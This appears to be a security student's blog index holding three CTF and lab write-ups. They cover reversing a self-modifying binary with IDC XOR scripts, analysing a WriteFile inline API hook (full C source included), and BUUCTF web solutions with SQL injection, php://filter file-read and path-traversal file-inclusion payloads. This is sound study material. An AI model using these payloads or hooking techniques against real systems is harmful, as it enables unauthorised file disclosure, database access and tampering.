{"meta":{"title":"K4oer'Blog","subtitle":"风也温柔","description":"Time is water","author":"K4oer","url":"http://K4oer.gitee.io","root":"/"},"pages":[{"title":"404","date":"2021-05-08T09:40:27.000Z","updated":"2021-05-08T09:45:11.283Z","comments":false,"path":"404/index-1.html","permalink":"http://k4oer.gitee.io/404/index-1.html","excerpt":"","text":""},{"title":"404","date":"2021-05-06T14:02:40.000Z","updated":"2021-05-06T14:02:40.560Z","comments":true,"path":"404/index.html","permalink":"http://k4oer.gitee.io/404/index.html","excerpt":"","text":""},{"title":"about","date":"2021-05-08T09:12:45.000Z","updated":"2021-05-08T09:13:19.094Z","comments":true,"path":"about/index.html","permalink":"http://k4oer.gitee.io/about/index.html","excerpt":"","text":""},{"title":"contact","date":"2021-05-08T09:13:48.000Z","updated":"2021-05-08T09:15:05.754Z","comments":true,"path":"contact/index.html","permalink":"http://k4oer.gitee.io/contact/index.html","excerpt":"","text":""},{"title":"","date":"2021-05-06T13:12:31.302Z","updated":"2021-05-06T13:12:12.058Z","comments":true,"path":"links/index.html","permalink":"http://k4oer.gitee.io/links/index.html","excerpt":"","text":"K4oer'CSDN"},{"title":"","date":"2021-05-06T13:10:18.964Z","updated":"2021-05-06T13:10:07.175Z","comments":true,"path":"links/link.css","permalink":"http://k4oer.gitee.io/links/link.css","excerpt":"","text":".allLinks { display: -webkit-flex; /* Safari */ display: flex; flex-wrap: wrap; justify-content: center; } .allLinks li { list-style: none; display: inline-flex; border-radius: 1rem; width: 20rem; height: 8rem; margin-top: 3rem; margin-right:2rem; overflow: hidden; /*超出边界部分隐藏*/ background-color: #403e3e; } .allLinks li img { width:6rem; height:6rem; border-radius: 50%; margin: 1rem; } .allLinks li a { width: 12rem; padding-top: 10%; text-align: center; cursor: pointer; text-decoration: none; font-size: 1.7rem; font-family: \"Helvetica Neue\", Helvetica, \"PingFang SC\", \"Hiragino Sans GB\", \"Microsoft YaHei\", 微软雅黑, Arial, sans-serif; color:#bbb; word-wrap: break-word; /*文字换行*/ }"},{"title":"","date":"2021-05-06T13:14:35.158Z","updated":"2021-05-06T13:14:35.158Z","comments":true,"path":"tags/index.html","permalink":"http://k4oer.gitee.io/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-05-06T14:02:26.000Z","updated":"2021-05-08T15:09:15.864Z","comments":true,"path":"friends/index-1.html","permalink":"http://k4oer.gitee.io/friends/index-1.html","excerpt":"","text":""},{"title":"categories","date":"2021-05-04T16:15:41.000Z","updated":"2021-05-04T16:15:41.988Z","comments":true,"path":"categories/index.html","permalink":"http://k4oer.gitee.io/categories/index.html","excerpt":"","text":""},{"title":"分类一","date":"2021-05-06T10:16:22.000Z","updated":"2021-05-08T09:11:41.163Z","comments":false,"path":"categories/index-1.html","permalink":"http://k4oer.gitee.io/categories/index-1.html","excerpt":"","text":""}],"posts":[{"title":"SMC代码自修改逆向分析","slug":"SMC代码自修改逆向分析（仅用汇编语言分析)","date":"2021-06-03T14:06:33.163Z","updated":"2021-06-03T14:06:40.420Z","comments":true,"path":"undefined/SMC代码自修改逆向分析（仅用汇编语言分析).html","link":"","permalink":"http://k4oer.gitee.io/undefined/SMC%E4%BB%A3%E7%A0%81%E8%87%AA%E4%BF%AE%E6%94%B9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%85%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%88%86%E6%9E%90).html","excerpt":"","text":"@[TOC] 写在前面 加密代码在文末附件 用到的idc解密脚本: 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;idc.idc&gt;static xor_setp1()&#123; auto addr = 0x00414c3c; //这里填入要解密字节串的起始地址 auto i = 0; for(i=0;addr+i&lt;0x00414C7F;i++) //循环结束的条件为字节串的结束地址 &#123; PatchByte(addr+i,Byte(addr+i)^0x7D); //异或的数字根据情况修改 &#125;&#125;static xor_setp2()&#123; auto addr = 0x00414be0; //这里填入要解密字节串的起始地址 auto i = 0; for(i=0;addr+i&lt;0x00414C3A;i++) //循环结束的条件为字节串的结束地址 &#123; PatchByte(addr+i,Byte(addr+i)^0x43); //异或的数字根据情况修改 &#125;&#125;static xor_setp3()&#123; auto addr = 0x00414a84; //这里填入要解密字节串的起始地址 auto i = 0; for(i=0;addr+i&lt;0x00414a84 + 347;i++) //循环结束的条件为字节串的结束地址 &#123; PatchByte(addr+i,Byte(addr+i)^0x55); //异或的数字根据情况修改 &#125;&#125;static xor_setp4()&#123; auto addr = 0x00414a30; //这里填入要解密字节串的起始地址 auto i = 0; for(i=0;addr+i&lt;0x00414a30 + 83;i++) //循环结束的条件为字节串的结束地址 &#123; PatchByte(addr+i,Byte(addr+i)^0x4D); //异或的数字根据情况修改 &#125;&#125;static main()&#123; xor_setp1();&#125; 实验分析第一层 用IDA打开7-3的实验练习.exe，进入主函数如下图所示： 主函数第一部分，主要的功能是按要求输入一串字符，并判断字符串长度是否等于28，如果不等于则输出”Try again……”，等于28则入下一模块 123456789101112lea eax, [ebp+Str] push eaxpush offset a100s ; &quot;%100s&quot;call _scanfadd esp, 8lea ecx, [ebp+Str]push ecx ; Strcall _strlenadd esp, 4mov [ebp+var_4], eaxcmp [ebp+var_4], 1Ch (28)jz short loc_40107F 接下来是判断字符串的最后一位（除\\n）是否为7Dh（”}”)，如果不是则将eax置零并返回，之后跳转到最终的栈销毁操作。是则进入下一模块 之后是for循环，条件为对byte_414C3C数组的前67个元素循环，在循环内部： 123456mov edx, [ebp+var_70]movsx eax, byte_414C3C[edx]xor eax, 7Dh //将byte_414C3C数组前67位元素每一位都异或7Dh(加密)mov ecx, [ebp+var_70]mov byte_414C3C[ecx], al //异或结果覆盖原来的值jmp short loc_401095 循环结束后： 1234567891011121314loc_4010BC:mov dword ptr [ebp-6Ch], offset byte_414C3C //将byte_414C3C数组赋给dword ptr [ebp-6Ch]mov esi, esppush offset unk_414BE0 //将unk414BE0也就是下一层加密代码的地址压入栈lea edx, [ebp+Str]push edxcall dword ptr [ebp-6Ch]add esp, 8cmp esi, espcall __chkespjmp short loc_4010E1 loc_4010E1:xor eax, eax //返回结果eax=0 了解第一层结构后对第一层代码进行解密，双击byte_414C3C查看内容，推测为SMC加密代码，长度为67，起始地址为00414C3C,结束地址为00414C7F 利用IDA执行idc解密脚本 1234567891011121314#include &lt;idc.idc&gt;static xor_setp1()&#123; auto addr = 0x00414c3c; //这里填入要解密字节串的起始地址 auto i = 0; for(i=0;addr+i&lt;0x00414C7F;i++) //循环结束的条件为字节串的结束地址 &#123; PatchByte(addr+i,Byte(addr+i)^0x7D); //异或的数字根据情况修改 &#125;&#125;static main()&#123; xor_setp1();&#125; 点击File-&gt;Script file，打开解密脚本解密后byte_414C3C变为：按快捷键C将字符串转换为汇编语言：右键loc_414C3C,点击create function将汇编语言转换为函数，使其可以进行F5反汇编：结果如下：发现其逻辑为判断前五个字符是否为”flag{“，不是则跳转到loc_414C7B,返回eax=0，是则进入loc_414C64，分析如下： 12345678910xor byte ptr [ecx+edx], 43h //将byte数组前90位逐位异或43hinc ecx //循环变量自增cmp ecx, 90 //循环条件:byte数组前90位jl short loc_414C64 // 即jump less指令，ecx小于90则跳转，do-while循环add eax, 5 push offset unk_414A84 //将偏移量unk_414A84压入栈,该地址对应的是第三层SMC函数地址push eaxcall edxpop ecxpop ecx 回到第一层main函数内给出的第二层自加密第二层代码： 1234567891011loc_4010BC:mov dword ptr [ebp-6Ch], offset sub_414C3Cmov esi, esppush offset unk_414BE0 //这里unk_414BE0嵌套在sub_414C3C,分析知为第二层的地址lea edx, [ebp+Str]push edxcall dword ptr [ebp-6Ch]add esp, 8cmp esi, espcall __chkespjmp short loc_4010E1 下面对unk_414BE0分析 第二层 双击unk_414BE0，如下：根据代码格式推测为SMC，字符串起始位置的地址为00414BE0,结束地址为00414C3B。对unk_414BE0进行解密,使用idc脚本 12345678910111213#include &lt;idc.idc&gt;static xor_setp2()&#123; auto addr = 0x00414be0; //这里填入要解密字节串的起始地址 auto i = 0; for(i=0;addr+i&lt;0x00414C3A;i++) //循环结束的条件为字节串的结束地址 &#123; PatchByte(addr+i,Byte(addr+i)^0x43); //异或的数字根据情况修改 &#125;&#125;static main()&#123; xor_setp2();&#125; 解密后：按快捷键C转换为汇编语言：右键create function得汇编函数，进行分析： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657.data:00414BE0 sub_414BE0 proc near ; DATA XREF: _main_0+B5↑o.data:00414BE0.data:00414BE0 var_8 = dword ptr -8.data:00414BE0 var_4 = byte ptr -4.data:00414BE0 arg_0 = dword ptr 8.data:00414BE0 arg_4 = dword ptr 0Ch.data:00414BE0.data:00414BE0 push ebp.data:00414BE1 mov ebp, esp.data:00414BE3 push ecx.data:00414BE4 push ecx.data:00414BE5 push ebx.data:00414BE6 mov ebx, [ebp+arg_0].data:00414BE9 lea eax, [ebp+var_8].data:00414BEC push esi.data:00414BED push edi.data:00414BEE xor edx, edx //edx变量置0.data:00414BF0 mov [ebp+var_8], 93A9A498h //[ebp+var_8]设 .data:00414BF7 mov edi, ebx //为-1817598824.data:00414BF9 mov [ebp+var_4], dl.data:00414BFC mov esi, edx.data:00414BFE sub edi, eax //edi减去eax结果存入edi .data:00414C00.data:00414C00 loc_414C00: ; CODE XREF: sub_414BE0+32↓j.data:00414C00 lea ecx, [ebp+var_8].data:00414C03 add ecx, esi //将ecx，esi相加.data:00414C05 mov al, [edi+ecx] //将edi和ecx对应的数赋给al寄存器.data:00414C08 xor al, 0CCh //al 异或0CCh.data:00414C0A cmp al, [ecx] //判断al的值是否和.data:00414C0C jnz short loc_414C31 //这里为while循环的标志,如果不相等跳到loc_414C31进行栈销毁，否则进入循环内部.data:00414C0E inc esi //esi自增.data:00414C0F cmp esi, 4 //判断esi是否和4相等.data:00414C12 jl short loc_414C00 //如果esi小于4则进行下一层，否则进入if语句内部.data:00414C14 mov ecx, [ebp+arg_4].data:00414C17.data:00414C17 loc_414C17: ; CODE XREF: sub_414BE0+42↓j.data:00414C17 xor byte ptr [edx+ecx], 55h //将edx和ecx相加的结果与55h异或.data:00414C1B inc edx //edx自增.data:00414C1C cmp edx, 15Bh //循环变量edx和15BH比较.data:00414C22 jl short loc_414C17 //do-while循环入口，如果edx小于15BH则进入循环，跳转到loc_414C17,否则跳出循环.data:00414C24 lea eax, [ebx+4] //ebx参数和4相加存入eax.data:00414C27 push offset unk_414A30 //将地址unk_414A30压入栈传入下面的ecx.data:00414C2C push eax .data:00414C2D call ecx //调用ecx函数.data:00414C2F pop ecx.data:00414C30 pop ecx.data:00414C31.data:00414C31 loc_414C31: ; CODE XREF: sub_414BE0+2C↑j.data:00414C31 pop edi.data:00414C32 pop esi.data:00414C33 xor eax, eax.data:00414C35 pop ebx.data:00414C36 mov esp, ebp.data:00414C38 pop ebp.data:00414C39 retn.data:00414C39 sub_414BE0 endp.data:00414C39 根据分析可知while代码执行的条件为： *(a1+v3)^0xCC == (&amp;v5+v3)， 也就是输入的字符异或0xCC对应与v5中的数0x93A9A498相等，求得字符为_ehT, 由于与输入的字符顺序相反，故输入的第6-9个字符为The_。 回到第二层sub_414C3C函数,对于传入的地址unk_414A84进行分析 第三层 双击unk_414A84 分析代码逻辑为SMC自加密，同理使用idc脚本：123456789101112131415#include &lt;idc.idc&gt;static xor_setp3()&#123; auto addr = 0x00414a84; //这里填入要解密字节串的起始地址 auto i = 0; for(i=0;addr+i&lt;0x00414a84 + 347;i++) //循环结束的条件为字节串的结束地址 &#123; PatchByte(addr+i,Byte(addr+i)^0x55); //异或的数字根据情况修改 &#125;&#125;static main()&#123; xor_setp3();&#125; 解密结果为：按快捷键C转换为汇编语言：右键点击create function转换为函数：发现出现很多诸如”A-Z”，”a-z”，”0-9”以及结尾出现的”=”推测进行的是base64加密，分析汇编语言结构：前几个loc函数都有cmp和jle等循环标志,继续分析，注意到1234567.data:00414AD2 mov dword ptr [ebp+var_10], &#x27;hVmc&#x27;.data:00414AD9 mov dword ptr [ebp+var_10+4], &#x27;0NEb&#x27;.data:00414AE0 mov dword ptr [ebp+var_10+8], &#x27;=8lR&#x27;.data:00414AE7 stosd.data:00414AE8 mov [ebp+var_10+0Ch], cl.data:00414AEB stosd.data:00414AEC mov edi, ecx 这里传入了固定字符串”cmVhbEN0Rl8=”推测为flag的第10到17位，接下来的几个loc函数为base64的右移运算部分。在函数的末尾，注意到dl和固定字符串在while循环内进行了相等判断，同时可以用OD进行动态运行该程序到第三个函数随便输入的字符串加密后的结果仍为固定字符串，因此对字符串base64解密得：realCtF_，如果比较正确后则对sub_414A30函数解密并编译,即该程序的第三层嵌套：回到第二层给出的地址 unk_414A30，进入下一层分析 第四层 双击unk_414A30查看 同理分析其为SMC自加密，使用idc脚本解密： 1234567891011121314#include &lt;idc.idc&gt;static xor_setp4()&#123; auto addr = 0x00414a30; //这里填入要解密字节串的起始地址 auto i = 0; for(i=0;addr+i&lt;0x00414a30 + 83;i++) //循环结束的条件为字节串的结束地址 &#123; PatchByte(addr+i,Byte(addr+i)^0x4D); //异或的数字根据情况修改 &#125;&#125;static main()&#123; xor_setp4();&#125; 解密结果： 按快捷键C转换为汇编代码：右键create function生成汇编函数：分析逻辑，注意到函数压入了6FF22h,68344360h,7574766Bh,转换为字符串为”kvtu`C4h\\&quot;o“,在loc_414A55函数中，edx自增后，将byte ptr [ebp+edx+var_C]和bl（之前存入得三串字符串）判断是否相等，并且如果不相等则跳转到本身，分析为while循环，在循环内部，edi减去了esi，而esi为参数地址，edi为字符串，而在loc_414A68中又进行了dec ecx即ecx自减，可知逻辑为将参数地址所有的字符减1和字符串比较，所以输入的字符串应该为”just_B3g!n”。 总结综上所述，flag为 ：flag{The_realCtF_just_B3g!n} 附件链接：https://pan.baidu.com/s/1WsgS9GHjbZOjjS6YuJiYhQ提取码：j2km","categories":[{"name":"逆向","slug":"逆向","permalink":"http://k4oer.gitee.io/categories/%E9%80%86%E5%90%91/"}],"tags":[]},{"title":"","slug":"WriteFileApIHook1逆向分析","date":"2021-05-24T11:42:03.848Z","updated":"2021-05-23T03:55:29.370Z","comments":true,"path":"undefined/WriteFileApIHook1逆向分析.html","link":"","permalink":"http://k4oer.gitee.io/undefined/WriteFileApIHook1%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.html","excerpt":"","text":"WriteFileApIHook1逆向分析1.实验结果打开set_pwd.exe，从名称来看应该是进行密码设置，程序提示输入key：随便输入11111，结果如下：try again，当尝试输入hook时，显示如下： 打开在文件夹中生成的pwd.txt文件，发现第一次的结果并不是我们输入的11111，而是hook，重复几次发现结果相同。 2.实验工具IDA (静态和动态分析) 3.实验分析使用IDA打开exe文件 静态分析打开IDA View-B 窗口，结合所学定位到main函数及一些关键函数如virtualprotect 同时注意到有sub等汇编指令，可知这里便是主函数修改writefile前5个字节的地方，静态分析主函数功能: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283.text:004011EE mov [ebp+Stream], 0.text:004011F5 mov [ebp+var_14], 0.text:004011FC mov [ebp+var_20], 0E9h //将0E9h压入数组为之后改变指令做准备.text:00401200 mov [ebp+var_1F], 0.text:00401204 xor eax, eax.text:00401206 mov [ebp+var_1E], eax.text:00401209 mov ecx, ds:dword_4280C8.text:0040120F mov [ebp+Buffer], ecx.text:00401212 mov edx, ds:dword_4280CC.text:00401218 mov [ebp+var_58], edx.text:0040121B mov al, ds:byte_4280D0.text:00401220 mov [ebp+var_54], al.text:00401223 mov esi, esp.text:00401225 push offset ModuleName ; &quot;kernel32.dll&quot;.text:0040122A call ds:GetModuleHandleA.text:00401230 cmp esi, esp.text:00401232 call __chkesp.text:00401237 mov [ebp+hModule], eax.text:0040123A mov esi, esp.text:0040123C push offset ProcName ; &quot;WriteFile&quot;.text:00401241 mov ecx, [ebp+hModule].text:00401244 push ecx ; hModule.text:00401245 call ds:GetProcAddress.text:0040124B cmp esi, esp.text:0040124D call __chkesp .text:00401252 mov [ebp+var_C], eax.text:00401255 mov edx, [ebp+var_C].text:00401258 mov [ebp+lpAddress], edx.text:0040125B mov esi, esp.text:0040125D lea eax, [ebp+flOldProtect].text:00401260 push eax ; lpflOldProtect.text:00401261 push 40h ; &#x27;@&#x27; ; flNewProtect.text:00401263 push 5 ; dwSize.text:00401265 mov ecx, [ebp+lpAddress].text:00401268 push ecx ; lpAddress.text:00401269 call ds:VirtualProtect //调用virtualProtect函数，同时为If语句判断.text:0040126F cmp esi, esp .text:00401271 call __chkesp.text:00401276 test eax, eax.text:00401278 jz short loc_4012E9.text:0040127A push 5 ; Size.text:0040127C mov edx, [ebp+lpAddress].text:0040127F push edx ; Src.text:00401280 push offset unk_42DC64 ; void *.text:00401285 call _memcpy //第一个memcpy函数将writefile函数的前5个字节保存.text:0040128A add esp, 0Ch.text:0040128D mov eax, offset sub_40100A.text:00401292 cdq.text:00401293 mov ecx, eax.text:00401295 mov esi, edx.text:00401297 mov eax, [ebp+var_C].text:0040129A cdq.text:0040129B sub ecx, eax.text:0040129D sbb esi, edx.text:0040129F sub ecx, 5 .text:004012A2 sbb esi, 0.text:004012A5 mov [ebp+Src], ecx //计算mywritefile函数和write函数的偏移值，同时.text:004012A8 push 4 ; Size //减去writefile函数的前5个字节.text:004012AA lea edx, [ebp+Src].text:004012AD push edx ; Src.text:004012AE lea eax, [ebp+var_1F].text:004012B1 push eax ; void *.text:004012B2 call _memcpy //第二个memcpy函数将计算出的偏移值与数组中的.text:004012B7 add esp, 0Ch //0E9h拼接形成jmp跳转指令改变原本要跳转到.text:004012BA push 5 ; Size //writefile函数为到自定义的mywritefile函数.text:004012BC lea ecx, [ebp+var_20].text:004012BF push ecx ; Src.text:004012C0 mov edx, [ebp+var_C].text:004012C3 push edx ; void * .text:004012C4 call _memcpy //第三个memcpy函数将jmp指令写到writefile函数.text:004012C9 add esp, 0Ch //中改变原有函数实现hook.text:004012CC mov esi, esp.text:004012CE lea eax, [ebp+flOldProtect].text:004012D1 push eax ; lpflOldProtect.text:004012D2 mov ecx, [ebp+flOldProtect].text:004012D5 push ecx ; flNewProtect.text:004012D6 push 5 ; dwSize.text:004012D8 mov edx, [ebp+var_C].text:004012DB push edx ; lpAddress.text:004012DC call ds:VirtualProtect //最后调用virtualProtect函数.text:004012E2 cmp esi, esp.text:004012E4 call __chkesp.text:004012E9 动态分析分别在主函数的调用writefile函数以及mywritefile函数的调用中设置断点，否则动态分析时程序会自动运行到结尾，mywritefile: （ps:直接基于地址进行调用，而不是基于函数名） 主函数： 使用IDA的动态分析 程序运行后在主函数的断点处停止，将要调用writefile函数，单步步入观察 发现kernel32 writefile函数的指令发生改变，由于修改了writefile函数的前5个字节导致第一条指令变为跳转到sub_40100A(mywrite函数)，之后的指令由于汇编的线性扫描算法导致机器指令被打乱，变成了数字，继续单步步入：发现跳转到了mywrite(su_40100A)的入口处 继续观察，进入mywritefile函数 在mywrite函数中 123456789101112131415161718192021222324252627282930313233343536373839404142434445 mov eax, ds:dword_428038 //为新声明的buff数组，6B6F68h为&#x27;hook&#x27;的十六进制数.text:0040111D mov dword ptr [ebp+Str], eax.text:00401120 mov cl, ds:byte_42803C .text:00401126 mov [ebp+var_8], cl .text:00401129 call sub_401005 //调用了unhook函数脱钩.text:0040112E mov esi, esp.text:00401130 push offset ProcName ; &quot;WriteFile&quot;.text:00401135 mov edi, esp.text:00401137 push offset ModuleName ; &quot;kernel32.dll&quot;.text:0040113C call ds:GetModuleHandleA .text:00401142 cmp edi, esp.text:00401144 call __chkesp.text:00401149 push eax ; hModule.text:0040114A call ds:GetProcAddress //获取kernel32中wrierfile的地址.text:00401150 cmp esi, esp.text:00401152 call __chkesp.text:00401157 mov [ebp+var_4], eax.text:0040115A mov esi, esp.text:0040115C mov edx, [ebp+arg_10].text:0040115F push edx.text:00401160 mov eax, [ebp+arg_C].text:00401163 push eax.text:00401164 lea ecx, [ebp+Str].text:00401167 push ecx ; Str.text:00401168 call _strlen.text:0040116D add esp, 4.text:00401170 push eax.text:00401171 lea edx, [ebp+Str].text:00401174 push edx.text:00401175 mov eax, [ebp+arg_0].text:00401178 push eax.text:00401179 call [ebp+var_4].text:0040117C cmp esi, esp.text:0040117E call __chkesp.text:00401183 mov eax, 1.text:00401188 pop edi.text:00401189 pop esi.text:0040118A pop ebx.text:0040118B add esp, 4Ch.text:0040118E cmp ebp, esp.text:00401190 call __chkesp.text:00401195 mov esp, ebp.text:00401197 pop ebp.text:00401198 retn 14h.text:00401198 sub_401100 endp 先分析一下unhook函数（sub_401005），单步步入 其汇编指令： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051mov esi, esp.text:0040104A push offset ProcName ; &quot;WriteFile&quot;.text:0040104F mov edi, esp.text:00401051 push offset ModuleName ; &quot;kernel32.dll&quot;.text:00401056 call ds:GetModuleHandleA.text:0040105C cmp edi, esp.text:0040105E call __chkesp.text:00401063 push eax ; hModule.text:00401064 call ds:GetProcAddress //获取writefile函数的地址.text:0040106A cmp esi, esp.text:0040106C call __chkesp.text:00401071 mov [ebp+var_C], eax.text:00401074 mov eax, [ebp+var_C].text:00401077 mov [ebp+lpAddress], eax.text:0040107A mov esi, esp.text:0040107C lea ecx, [ebp+flOldProtect].text:0040107F push ecx ; lpflOldProtect.text:00401080 push 40h ; &#x27;@&#x27; ; flNewProtect.text:00401082 push 5 ; dwSize.text:00401084 mov edx, [ebp+lpAddress].text:00401087 push edx ; lpAddress.text:00401088 call ds:VirtualProtect //根据地址获取writefile的前5个字节.text:0040108E cmp esi, esp .text:00401090 call __chkesp.text:00401095 push 5 ; Size.text:00401097 push offset unk_42DC64 ; Src.text:0040109C mov eax, [ebp+lpAddress].text:0040109F push eax ; void *.text:004010A0 call _memcpy //调用memcpy函数将之前保存的writefile函数前5个字节复原.text:004010A5 add esp, 0Ch.text:004010A8 mov esi, esp.text:004010AA lea ecx, [ebp+flOldProtect].text:004010AD push ecx ; lpflOldProtect.text:004010AE mov edx, [ebp+flOldProtect].text:004010B1 push edx ; flNewProtect.text:004010B2 push 5 ; dwSize.text:004010B4 mov eax, [ebp+lpAddress].text:004010B7 push eax ; lpAddress.text:004010B8 call ds:VirtualProtect //再次hook住以便下次操作.text:004010BE cmp esi, esp.text:004010C0 call __chkesp.text:004010C5 pop edi.text:004010C6 pop esi.text:004010C7 pop ebx.text:004010C8 add esp, 4Ch.text:004010CB cmp ebp, esp.text:004010CD call __chkesp.text:004010D2 mov esp, ebp.text:004010D4 pop ebp.text:004010D5 retn.text:004010D5 sub_401030 endp 回到mywrite函数，mywrite函数还会重新调用writefile函数进行文件写入，直接运行到断点处进入调用的write函数中观察 发现writefile函数前5个字节已经被复原，指令被修复 writefile函数的功能就是将mywritefile中buf数组的内容写入文件中，直接运行结束，打开文件夹发现新生成的pwd.txt内容正如分析的为hook 在主函数结尾，又对生成的pwd文件进行扫描（失败则输出scan fail)，并与输入的key进行比较，如果两者相等则输出congratulations!,否则输出try again! 附源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt; BYTE pOrgByte[5] = &#123; 0, &#125;;typedef BOOL(WINAPI *PFWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);void unhook()&#123; DWORD dwOldProtect; PBYTE pWriteFile; FARPROC pFunc; pFunc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;WriteFile&quot;); pWriteFile = (PBYTE)pFunc; VirtualProtect(pWriteFile, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); memcpy(pWriteFile, pOrgByte, 5); VirtualProtect(pWriteFile, 5, dwOldProtect, &amp;dwOldProtect);&#125;BOOL __stdcall MyWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)&#123; FARPROC pFunc; char buf[] =&quot;hook&quot;; unhook(); pFunc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;WriteFile&quot;); ((PFWriteFile)pFunc)(hFile, buf, strlen(buf), lpNumberOfBytesWritten, lpOverlapped); return TRUE;&#125;int main()&#123; HANDLE hFile; HMODULE hKernel32; FARPROC pWriteFile; FILE *fp=NULL; FILE *fkey=NULL; PBYTE pEditFunc; BYTE pJmpCode[6] = &#123; 0xE9,0, &#125;; char pwd[15]; char key[15]; int ret; DWORD dwOldProtect, pOffset,dwWritenSize; char buf[] = &quot;real_pwd&quot;; hKernel32 = GetModuleHandle(&quot;kernel32.dll&quot;); pWriteFile = GetProcAddress(hKernel32, &quot;WriteFile&quot;); pEditFunc = (PBYTE)pWriteFile; if (VirtualProtect(pEditFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) &#123; memcpy(pOrgByte, pEditFunc, 5); pOffset = (ULONGLONG)MyWriteFile - (ULONGLONG)pWriteFile - 5; memcpy(&amp;pJmpCode[1], &amp;pOffset, 4); memcpy(pWriteFile, &amp;pJmpCode[0], 5); VirtualProtect(pWriteFile, 5, dwOldProtect, &amp;dwOldProtect); &#125; hFile = CreateFile(&quot;pwd.txt&quot;, GENERIC_ALL,0, NULL, CREATE_ALWAYS, 0x80, NULL); /* if(hFile!=NULL) printf(&quot;open1 success\\n&quot;); else printf(&quot;open1 fail\\n&quot;); */ WriteFile(hFile, buf, strlen(buf), &amp;dwWritenSize, NULL); CloseHandle(hFile); if(fp=fopen(&quot;pwd.txt&quot;,&quot;r&quot;)) printf(&quot;open success\\n&quot;); else printf(&quot;open fail\\n&quot;); if(fp!=NULL) fscanf(fp,&quot;%s&quot;,pwd); else printf(&quot;scan fail\\n&quot;); printf(&quot;plz input key\\n&quot;); scanf(&quot;%s&quot;,key); if(fp!=NULL) fclose(fp); ret=lstrcmp(key,pwd); //将输入的key和pwd进行比较 if(ret == 0) printf(&quot;congratulations!\\n&quot;); else printf(&quot;try again!\\n&quot;); system(&quot;Pause&quot;); return 0; &#125;","categories":[],"tags":[]},{"title":"","slug":"【BUUCTF刷题】Web解题方法总结（一)","date":"2021-05-08T15:03:36.190Z","updated":"2021-05-08T15:02:54.719Z","comments":true,"path":"undefined/【BUUCTF刷题】Web解题方法总结（一).html","link":"","permalink":"http://k4oer.gitee.io/undefined/%E3%80%90BUUCTF%E5%88%B7%E9%A2%98%E3%80%91Web%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80).html","excerpt":"","text":"@TOC 前言1边刷题边总结些知识点，还在更新，冲！ 信息搜集1.dirsearch使用下载地址：https://github.com/maurosoria/dirsearch切换到安装目录 1py dirsearch.py -u 网址 -e 语言（一般用*） -u 指定url-e 指定网站语言 SQL缺省payload：*,1 查询语句：select *,1||flag from Flag 解题思路2：payload:1;set sql_mode=PIPES_AS_CONCAT;select 1 解析： 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。但在mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat 来实现oracle 的一些功能。 代码审计1.使用php伪协议读文件内容。使用filter过滤器 1?file=php://filter/convert.base64-encode/resource=flag.php 例题：BUUCTFweb Secret File抓包 phpmyadmin 4.8.1的一个远程文件包含的漏洞(CVE) 白名单验证：例题：BUUCTF web warmup示例代码如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) ##不能为空 &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) ##是字符串 &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ##上面checkfile返回为true ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 分析 checkfile()函数定义了一个白名单：source.php和hint.php，判断 $page是否为空、是否为字符串。判断 $page是否在白名单里，若存在返回true；考虑到page有参数的情况， $_page是取出 $page问号前的东西，然后再判断 $_page是否在白名单里，若存在则返回true；两个函数一个mb_substr和mb_strpos，总的意思就是截取变量page中?前面的字符串，然后再进行白名单校验。之后是url二次编码问题，需要将?进行二次url编码所以构造payload： 123file=hint.php%253f/../../../../../../../../ffffllllaaaagggg或者file=hint.php?file://../../../../../ffffllllaaaagggg 1因为服务器会自动解一次码，所以 